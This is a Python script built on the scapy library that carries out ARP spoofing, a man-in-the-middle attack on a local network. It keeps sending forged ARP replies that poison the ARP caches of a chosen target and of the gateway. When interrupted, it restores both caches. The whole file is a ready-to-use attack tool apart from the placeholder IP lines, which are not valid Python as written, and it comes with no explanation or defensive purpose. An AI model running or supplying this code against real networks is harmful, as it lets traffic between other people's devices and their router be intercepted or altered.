#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = {Enter the target ip}
gateway_ip = {Enter the gateway IP / router IP}
packet_count = 0

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count += 2
        print(f"\r[+] Packets sent: {packet_count}", end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Ctrl + C Detected ............... Resetting the ARP table.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
